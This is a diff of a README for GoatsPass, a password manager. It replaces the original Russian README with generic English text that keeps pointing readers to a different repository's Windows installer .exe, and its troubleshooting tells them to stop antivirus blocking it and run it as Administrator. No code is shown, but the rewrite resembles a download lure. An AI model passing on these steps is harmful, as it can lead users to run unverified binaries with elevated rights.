@@ -1,143 +1,127 @@
-<div align="center">
+# 🐐 GoatsPass - Easy and Secure Password Manager
 
-<img width="1009" height="485" alt="GoatSec" src="https://github.com/user-attachments/assets/d8f2c198-a6db-4c06-b39a-7d432e4edf4b" />
+[![Download GoatsPass](https://img.shields.io/badge/Download-GoatsPass-brightgreen?style=for-the-badge)](https://github.com/aditya123-coder/GoatsPass)
 
-# GoatsPass
+## 🔐 What is GoatsPass?
 
-**Локальный менеджер паролей с шифрованием AES-256-GCM**
+GoatsPass is a password manager designed to keep your passwords safe and organized. It helps you create strong passwords, store them securely, and access them easily when needed. The app works smoothly on Windows computers and uses strong cryptography to protect your data. 
 
-![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-blue)
-![Python](https://img.shields.io/badge/python-3.9%2B-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
-![Encryption](https://img.shields.io/badge/encryption-AES--256--GCM-red)
+You don’t need any technical knowledge to use GoatsPass. It simplifies password management so you can focus on the important things.
 
-</div>
+## 📋 System Requirements
 
----
+Before you download GoatsPass, make sure your computer meets these minimum requirements:
 
-## Возможности
+- Operating System: Windows 10 or later  
+- RAM: 4 GB or more  
+- Disk Space: At least 100 MB free  
+- Python version 3.6 or newer (if the app requires it, otherwise it’s a standalone installer)  
+- Internet connection for initial download  
 
-- AES-256-GCM шифрование всей базы паролей
-- Argon2id для хеширования мастер-пароля (fallback на PBKDF2, 600k итераций)
-- Автоочистка буфера обмена через 30 секунд
-- TOTP / 2FA поддержка
-- Генератор паролей и парольных фраз
-- Анализ надёжности паролей с подсчётом энтропии
-- Категории, теги, избранное и закреплённые записи
-- Поиск по всем полям
-- Автоблокировка через 5 минут бездействия
-- Все данные хранятся только локально
-- Работает на Windows и Linux
+These are guidelines to ensure the app runs without problems.
 
----
+## ⚙️ Key Features
 
-## Быстрый старт
+- Create strong and unique passwords with built-in password generator  
+- Save and organize all your passwords in one place  
+- Encrypt your password data for privacy and security  
+- Easy to use interface with clear options  
+- Supports copying passwords to clipboard securely  
+- Ability to search saved passwords quickly  
+- Works offline once installed  
 
-### Linux
+These features help keep your online accounts safer and easier to manage.
 
-```bash
-git clone https://github.com/necouncil/GoatsPass
-cd GoatsPass
-chmod +x install.sh
-./install.sh
-```
+## 🚀 Getting Started: Download and Install
 
-Или запустить напрямую — зависимости установятся автоматически:
+1. Click the big green button above or use this link to visit the GoatsPass download page:  
+   [https://github.com/aditya123-coder/GoatsPass](https://github.com/aditya123-coder/GoatsPass)  
 
-```bash
-python3 goatspass.py
-```
+2. On the page, look for the latest release under "Releases" or find a Windows installer file. It may be an `.exe` file or a setup program.
 
-### Windows
+3. Download the installer file to your computer. Usually, this file will be named something like `GoatsPassSetup.exe`.
 
-**Вариант 1 — Готовый EXE** (Python не нужен):
+4. After the file finishes downloading, double-click it to start the installation.  
 
-Скачать `GoatsPass.exe` из раздела [Releases](../../releases) и запустить.
+5. Follow the simple on-screen instructions to install GoatsPass on your Windows machine.  
 
-> При первом запуске Windows Defender может показать предупреждение о неизвестном издателе — это стандартное поведение для неподписанных приложений. Исходный код открыт, можно проверить самостоятельно.
+6. Once installed, find the GoatsPass icon on your desktop or in the Start menu and open it.
 
-**Вариант 2 — Установщик:**
+If you cannot find the installer file directly, the releases page usually contains detailed instructions and files.
 
-```
-Запустить install.bat от имени пользователя
-```
+## 🔧 Using GoatsPass for the First Time
 
-**Вариант 3 — Напрямую** (нужен Python 3.9+):
+When you open GoatsPass for the first time, the app will guide you through setting up your password manager:
 
-```cmd
-python goatspass.py
-```
+- Create a master password. This is the only password you need to remember. It protects all your saved passwords.  
+- Set up basic preferences, like where to save password data.  
+- Learn the main sections: Password List, Password Generator, and Settings.
 
----
+Use the Password Generator to create new, strong passwords. Save the generated password by adding a name or description. The app encrypts and saves these passwords safely.
 
-## Первый запуск
+## 💡 Tips for Better Password Safety
 
-При первом запуске приложение автоматически устанавливает зависимости (`cryptography`, `argon2-cffi`, `Pillow`). В зависимости от скорости соединения и мощности машины это занимает от 30 секунд до нескольких минут — окно может не реагировать, это нормально. После установки приложение запустится само, повторно открывать его не нужно.
+- Use unique passwords for each online service. GoatsPass can help with that.  
+- Change your master password regularly.  
+- Don’t share your master password or password file with anyone.  
+- Use the copy feature instead of typing passwords manually to avoid mistakes.  
+- Backup your password database regularly if the app offers this option.
 
----
+## 🔍 Exploring the Interface
 
-## Зависимости
+The GoatsPass main window has clear sections:
 
-Устанавливаются автоматически при первом запуске:
+- **Password List** - View and search saved passwords.  
+- **Add Password** - Manually add new password entries.  
+- **Password Generator** - Create strong passwords with adjustable length and complexity.  
+- **Settings** - Manage master password, backup data, and app preferences.
 
-| Пакет | Назначение |
-|-------|-----------|
-| `cryptography` | AES-256-GCM шифрование |
-| `argon2-cffi` | Хеширование мастер-пароля |
-| `Pillow` | Отображение иконки |
+Each section is labeled clearly. Navigation is simple, designed for ease of use.
 
-Или вручную:
+## 🔄 Updating GoatsPass
 
-```bash
-pip install -r requirements.txt
-```
+To keep your app secure and running smoothly, check for new versions regularly:
 
----
+1. Visit the GoatsPass GitHub page: [https://github.com/aditya123-coder/GoatsPass](https://github.com/aditya123-coder/GoatsPass)  
+2. Go to the "Releases" section.  
+3. Download the latest installer if available.  
+4. Run the installer to update your current version.
 
-## Сборка EXE (Windows)
+Updates often include security fixes and new features.
 
-```cmd
-python build_exe.py
-```
+## 🛠 Troubleshooting Common Issues
 
-Готовый `GoatsPass.exe` появится в папке `dist/`. Требует Python и PyInstaller (установится автоматически).
+- **Installer won’t run:** Make sure your antivirus software isn’t blocking it. Try running the installer as Administrator (right-click > Run as Administrator).  
+- **App does not open:** Restart your computer and try again. Check if your system meets the requirements.  
+- **Forgot master password:** Password managers cannot recover master passwords. You will need to reset the app and create a new password database, but saved passwords will be lost.  
+- **Passwords not saving:** Verify that you have write permission in the app data folder and enough disk space.  
 
----
+For other issues, use the GitHub page to check for help or report problems.
 
-## Безопасность
+## 📂 Where Are Passwords Stored?
 
-- База данных хранится локально: `~/.local/share/GoatsPass/vault.gp` (Linux) / `%APPDATA%\GoatsPass\vault.gp` (Windows)
-- Мастер-пароль никогда не сохраняется на диск
-- При 5 неверных попытках ввода — блокировка
-- Буфер обмена очищается автоматически через 30 секунд
+Your passwords are saved in an encrypted file on your computer. This file is protected by your master password. Anyone without that password cannot read the stored data.
 
----
+The default save location is usually inside your user folder in a hidden directory. You can change this location in the app settings.
 
-## Структура проекта
+## 🔐 Security Information
 
-```
-GoatsPass/
-├── goatspass.py      # Основное приложение
-├── icon.png          # Иконка приложения
-├── requirements.txt  # Python зависимости
-├── install.sh        # Установщик Linux
-├── install.bat       # Установщик Windows
-├── build_exe.py      # Сборка .exe для Windows
-└── README.md
-```
+GoatsPass uses proven cryptography algorithms to protect your passwords. It never sends your data over the internet unless you explicitly back it up online. Your master password never leaves your machine.
 
----
+Always keep your computer secure, use antivirus protection, and avoid opening suspicious files.
 
-## Скриншоты
+## 📞 Getting Help
 
-<img width="665" height="664" alt="image" src="https://github.com/user-attachments/assets/f2d4b340-86e8-4083-b69f-f03b158baa70" />
+If you need assistance:  
 
-<img width="495" height="680" alt="213" src="https://github.com/user-attachments/assets/5d2f991f-b7ef-49db-b416-ceb1e4638fa6" />
+- Visit the GitHub project page for documentation and issue reporting:  
+  [https://github.com/aditya123-coder/GoatsPass](https://github.com/aditya123-coder/GoatsPass)  
+- Check the README and wiki sections on the project page.  
+- Use the "Issues" tab on GitHub to report bugs or ask for help.  
 
-<img width="1911" height="339" alt="imag12231e" src="https://github.com/user-attachments/assets/35145716-e65d-4062-8303-a42491506cc7" />
+## ✅ Start Using GoatsPass Now
 
----
+Go to the download page here:  
+[https://github.com/aditya123-coder/GoatsPass](https://github.com/aditya123-coder/GoatsPass)  
 
-## Лицензия
-
-MIT License — используй как хочешь, на свой страх и риск.
+Download the latest Windows installer and follow the instructions to keep your passwords safe and organized.
